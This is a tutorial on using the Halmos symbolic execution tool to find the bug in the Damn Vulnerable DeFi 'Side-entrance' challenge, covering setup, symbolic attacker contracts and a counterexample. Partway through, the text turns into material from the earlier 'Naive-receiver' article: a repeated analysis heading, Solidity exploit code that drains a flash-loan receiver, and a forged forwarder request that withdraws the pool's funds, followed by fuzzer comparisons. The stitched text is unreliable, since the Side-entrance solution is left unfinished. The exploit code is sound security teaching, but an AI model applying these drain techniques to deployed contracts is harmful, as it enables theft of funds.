# Halmos vs Side-entrance
## Halmos version
halmos 0.2.2.dev1+gd4cac2e was used in this article
## Foreword
It is strongly assumed that the reader is familiar with the previous articles on solving 
1. ["Unstoppable"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. ["Truster"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster), 
3. ["Naive-receiver"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)

since the main ideas here are largely repeated and we will not dwell on them again.
## Preparation
### Common prerequisites
1. Copy SideEntrance.t.sol file to SideEntranceHalmos.t.sol. We will work in this file.
2. Rename “test_sideEntrance()” to "check_sideEntrance()", so Halmos will execute this test symbolically.
3. Avoid using makeAddr() cheatcode:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    ```
4. Create GlobalStorage contract and save pool's address-name pair:
    ```solidity
    import "lib/GlobalStorage.sol";
    ...
    contract SideEntranceChallenge is Test {
        ...
        GlobalStorage glob;
        ...
        function setUp() public {
            startHoax(deployer);
            glob = new GlobalStorage();
            ...
            glob.add_addr_name_pair(address(pool), "SideEntranceLenderPool");
            vm.stopPrank();
        }
    ...
    }
    ```
5. Bypass issue #338
    ```solidity
    startHoax(deployer, 1 << 80);
    ```
6. Print all contract addresses, including the upcoming SymbolicAttacker:
    ```solidity
    function check_sideEntrance() public checkSolvedByPlayer {
        SymbolicAttacker attacker = new SymbolicAttacker();
        console.log("GlobalStorage\t\t", address(glob));
        console.log("SideEntranceLenderPool\t", address(pool));
        console.log("SymbolicAttacker\t\t", address(attacker));
        ...
    }
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_sideEntrance
    ...
    [console.log] GlobalStorage              0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] SideEntranceLenderPool     0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] SymbolicAttacker           0x00000000000000000000000000000000000000000000000000000000aaaa0004
    ```
### _isSolved() implementation
The original checks look like:
```solidity
function _isSolved() private view {
    assertEq(address(pool).balance, 0, "Pool still has ETH");
    assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
}
```
This time we won't be doing a completely opposite check. Instead, taking into account the lessons we learned in the previous "Naive-receiver", we will first look for just some bug. Let's remove the condition about recovery and find out if we can even empty the pool by some amount
```solidity
function _isSolved() private view {
    assert(address(pool).balance >= ETHER_IN_POOL);
}
```
### SymbolicAttacker implementation
In this challenge, we first encounter the logic of using native ETH assets instead of some token or wrapped ETH (WETH). Therefore, it is natural that SymbolicAttacker should also consider ETH value in transactions. First, when we deploy a contract, Halmos correctly assumes that its balance may already be non-zero, preventing a possible [force feeding](https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/force-feeding/) scenario. Therefore, as soon as we have deployed the contract, its ETH balance is already a symbolic value. However, this is inconvenient in our case, so we will explicitly state that SymbolicAttacker's balance is player's balance. We still can execute transactions from player since Halmos doesn't count gas :):
```solidity
function check_sideEntrance() public checkSolvedByPlayer {
    SymbolicAttacker attacker = new SymbolicAttacker();
    vm.deal(address(attacker), PLAYER_INITIAL_ETH_BALANCE);
    vm.deal(address(player), 0); // Player's ETH is transferred to attacker.
    ...
```
And another important addition: now we pass in symbolic transactions not only the symbolic parameters of the function itself, but also the symbolic value of ETH:
```solidity
contract SymbolicAttacker is Test, SymTest {
    ...
    function execute_tx() private {
        uint256 ETH_val = svm.createUint256("ETH_val");
        address target = svm.createAddress("target");
        bytes memory data;
        //Get some concrete target-name pair
        (target, data) = glob.get_concrete_from_symbolic(target);
        target.call{value: ETH_val}(data);
    }
    ...
}
```
## Improvement of coverage
According to the familiar principle, we start with single symbolic transaction. Let's see if all the code is covered:
```solidity
function check_sideEntrance() public checkSolvedByPlayer {
    ...
    attacker.attack();
}
```
```solidity
contract SymbolicAttacker is Test, SymTest {
    ...
    function attack() public {
        execute_tx();
    }
```
### Callbacks
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance -vvvvv
...
Path #4:
            ...
            CALL SideEntranceLenderPool::flashLoan(p_amount_uint256_a507985_05()) (value: halmos_ETH_val_uint256_4f72fbf_01)
                CALL SymbolicAttacker::execute() (value: p_amount_uint256_a507985_05)
                ↩ REVERT 0x (error: Revert())
                ...
...
[PASS] check_sideEntrance() (paths: 9, time: 0.26s, bounds: [])
```
There is a problem here: SideEntranceLenderPool::flashLoan assumes that the contract that called this function has a payable callback "execute", which our SymbolicAttacker does not have. 
```solidity
contract SideEntranceLenderPool {
    ...
    function flashLoan(uint256 amount) external {
        ...
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    ...
    }
```
We implement a valid execute:
```solidity
function execute () external payable {
    uint256 ETH_val = svm.createUint256("ETH_val_execute");
    address target = svm.createAddress("target_execute");
    bytes memory data;
    //Get some concrete target-name pair
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call{value: ETH_val}(data);
}
```
And one more problem in SideEntranceLenderPool::withdraw.
Despite the fact that SymbolicAttacker had no pool balance at the time of the transaction, Halmos still attempted to transfer some symbolic amount of ETH to SymbolicAttacker. And this is what happened:
```javascript
Path #2:
...
           CALL SideEntranceLenderPool::withdraw() (value: halmos_ETH_val_uint256_4f72fbf_01)
           ...
                CALL SymbolicAttacker::0x
                ↩ REVERT 0x (error: Revert())
                ...
```
We don't have the receive() callback function, so we implement it as well:
```solidity
receive() external payable {
    uint256 ETH_val = svm.createUint256("ETH_val_receive");
    address target = svm.createAddress("target_receive");
    bytes memory data;
    //Get some concrete target-name pair
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call{value: ETH_val}(data);
}
```
### Preventing recursion
Now let's talk about possible recursion. This time, since we have 2 callback functions in SymbolicAttacker that behave like execute_tx(), we won't be able to conveniently use the vm.assume(...) pattern. At the same time, the standard ReentrancyGuard (ADD LINK) will not work for us, as it is common to all functions, which can cut off some scenarios.
So, let's make our simplest analogue of ReentrancyGuard:
```solidity
contract SymbolicAttacker is Test, SymTest {
...
    bool receive_reent_guard = false;
    bool execute_reent_guard = false;
    ...
    receive() external payable {
        if (receive_reent_guard) {
            revert();
        }
        receive_reent_guard = true;
        ...
        receive_reent_guard = false;
    }
    
    function execute () external payable {
        if (execute_reent_guard) {
            revert();
        }
        execute_reent_guard = true;
        ...
        execute_reent_guard = false;
    }
```
Run again:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance
...
[PASS] check_sideEntrance() (paths: 57, time: 1.70s, bounds: [])
...
```
Perfectly. The number of completed paths has increased. Well, you can already guess what will happen next :)
## Increasing transactions
Add another symbolic attacking transaction:
```solidity
function attack() public {
    execute_tx();
    execute_tx();
}
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance
...
Counterexample:
halmos_ETH_val_execute_uint256_c9b0694_07 = 0x000000000000000000000000000000000000000000000016bc1f3a7c229fd8e9
halmos_ETH_val_receive_uint256_4d032b7_19 = 0x000000000000000000000000000000000000000000000016c7c8b6b3a7640000
halmos_ETH_val_uint256_923f00f_01 = 0x0000000000000000000000000000000000000000000000000000000000000000
halmos_ETH_val_uint256_d146144_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
halmos_selector_bytes4_2929a1b_18 = withdraw
halmos_selector_bytes4_321817f_06 = flashLoan
halmos_selector_bytes4_487ba75_12 = deposit
halmos_selector_bytes4_780a835_24 = 0x00000000
halmos_target_address_742d8e0_14 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_8fb3daf_02 = 0x00000000000000000000000000000000aaaa0003
halmos_target_execute_address_b2f1b7a_08 = 0x00000000000000000000000000000000aaaa0003
halmos_target_receive_address_d6b1aa3_20 = 0x00000000000000000000000000000000aaaa0003
p_amount_uint256_b5e253c_05 = 0x000000000000000000000000000000000000000000000016b9e8000000000000
[FAIL] check_sideEntrance() (paths: 3334, time: 102.26s, bounds: [])
```
Okay, that was pretty easy. Let's analyze a counterexample.
## Counterexamples analysis
The counterexample clearly shows the sequence of what happened. 
SideEntranceLenderPool::flashLoan was called. pool called the execute() function from our SymbolicAttacker. He, in turn, using borrowed funds (and a little of his own), put them on deposit in the same pool. flashLoan ended successfully, as the balance of the pool at the time of the end of flashLoan became even larger. After that, the Attacker simply withdrew all the funds from the deposit with the withdraw() function in the second transaction. 



## Counterexamples analysis
This time we will not analyze each line of the counterexamples in detail. Note that 2 bugs were found here at once.
The mechanics of the first bug are quite simple - we launch **flashLoan**, as the receiver we specify the **FlashLoanReceiver** contract, which we do not own, thereby emptying it by 1 **WETH** per transaction. Precisely because it takes 10 such transactions to empty this balance to 0 - Halmos failed with a clearer invariant.
The mechanics of the second bug are very interesting. The fact is that for this we need to fulfill 2 conditions: run **withdraw** with **Forwarder** as a **msg.sender**, but at the same time bypass the concatenation of our address at the end of the **payload**:
```solidity
bytes memory payload = abi.encodePacked(newdata, request.from);
...
target.call(payload);
```
```solidity
if (msg.sender == trustedForwarder && msg.data.length >= 20) {
    return address(bytes20(msg.data[msg.data.length - 20:]));
}
```
And Halmos did find a scenario: it needs to be called from under multicall, which will allow us to withdraw on behalf of the **Forwarder** (via **delegateCall**), while withdrawing funds to an arbitrary receiver, emptying the balance of an arbitrary address, inserting it at the end of data. For this we needed the hint from **svm.createBytes()** earlier.
## Using a counterexample
Let's use the **attacker** to devastate the **FlashLoanReceiver**:
```solidity
pragma solidity =0.8.25;

import {NaiveReceiverPool, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";

contract Attacker {
    function attack(NaiveReceiverPool pool, FlashLoanReceiver receiver, WETH weth) public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, address(weth), 1, "b1bab0ba");
        }
    }
} 
```
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    Attacker attacker = new Attacker();
    attacker.attack(pool, receiver, weth);
    ...
}
```
Now we send all pool funds to recovery. We remember that we ignored the player's private key when testing through Halmos. The real attack, of course, requires us to craft a valid request to the **Forwarder**. This time we won't use an **attacker** contract. We don't want to transfer our private key to some contract :)
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
...
    bytes[] memory callDatas = new bytes[](1);
    callDatas[0] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes32(uint256(uint160(deployer)))
    );
    bytes memory callData;
    callData = abi.encodeCall(pool.multicall, callDatas);
    BasicForwarder.Request memory request = BasicForwarder.Request(
        player,
        address(pool),
        0,
        30000000,
        forwarder.nonces(player),
        callData,
        1 days
    );
    bytes32 requestHash = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );
    (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
    bytes memory signature = abi.encodePacked(r, s, v);
    require(forwarder.execute(request, signature));
}
```
Since we crafted the request ourselves, because we couldn't use calldata from Halmos for obvious reasons - I just copied this request from [here](https://medium.com/@opensiddhu993/challenge-2-naive-receiver-damn-vulnerable-defi-v4-lazy-solutions-series-8b3b28bc929d) by [@siddharth9903](https://github.com/siddharth9903) :).

```javascript
$ forge test -vv --mp test/naive-receiver/NaiveReceiver.t.sol
...
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.53ms (1.50ms CPU time)
```
Did it!
## Compare with fuzzing
We can find foundry-based, echidna-based and meduza-based solutions to this problem [here](https://github.com/devdacian/solidity-fuzzing-comparison/tree/main/test/01-naive-receiver).
However, I haven't found any solutions for the updated version of Naive-receiver (v4). The fact is that a second bug was added in the new version, which is tied precisely to the calldata craft and in **"Truster"** it almost became a blocker. Therefore, let's check whether there are fuzzers at all are able to work out the following logic.
### Target
First, write this POCTarget contract:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

contract POCTarget {
    uint256 public a;
    
    constructor() {
        a = 0;
    }

    function proxycall (bytes calldata data) public {
        address(this).call(data);
    }

    function changea () public {
        if (msg.sender != address(this)) {
            revert();
        }
        if (address(bytes20(msg.data[msg.data.length - 20:])) == address(this)) {
            a = 1;
        }
    }
}
```
If the fuzzer supports such logic, it will find a counterexample where a==1.
### Foundry
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "./POCTarget.sol";
import {Test, console} from "forge-std/Test.sol";

contract POCFuzzing is Test {
    POCTarget target;
    address deployer = makeAddr("deployer");

    function setUp() public {
        startHoax(deployer);
        target = new POCTarget();
        vm.stopPrank();
        targetSender(deployer);
    }

    function invariant_isWorking() public {
        assert (target.a() != 1);
    }
}
```
```javascript
$ forge test -vv --mp test/naive-receiver/POCFuzzing.t.sol
...
[PASS] invariant_isWorking() (runs: 1000, calls: 500000, reverts: 249958)
```
Not working
### Echidna
```javascript
deployer: '0xcafe0001' 
sender: ['0xcafe0002']
allContracts: true
workers: 8
```
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "./POCTarget.sol";
import {Test, console} from "forge-std/Test.sol";

contract POCFuzzing is Test {
    POCTarget target;
    address deployer = makeAddr("deployer");

    constructor() public payable {
        target = new POCTarget();
    }

    function echidna_isWorking() public returns (bool) {
        return target.a() != 1;
    }
}
```
```javascript
echidna test/naive-receiver/POCEchidna.t.sol --contract POCEchidna --config test/naive-receiver/naive-receiver.yaml --test-limit 10000000
...
echidna_isWorking: passing
...
```
Also not working. I think these results are enough to prove that Foundry and Echidna fuzzing would not cope with the new bug.
## Conclusions
1. Path explosion is a really serious problem of symbolic analysis. We had a setup of 4 not the largest contracts, but Halmos was unable to complete 2 transactions symbolically without serious simplifications.
2. You can and should use simplifications and optimizations. Sometimes nothing will work without it. The main thing is to choose heuristics successfully.
3. When creating invariants, you can follow the principle "If we can do something UNEXPECTED - we will easily find a full-fledged attack".
4. It is important to understand when it is better to use **svm.CreateCalldata()** and when to use **svm.createBytes()**. Each has its own unique areas of application.
5. Even given that we gave a strong hint that **svm.createBytes()** should be used at **withdraw->_msgSender()** function, Halmos did a great job of handling the raw calldata to find a bug, unlike Echidna and Foundry. The new version of Naive-receiver is not completely solved by fuzzing.
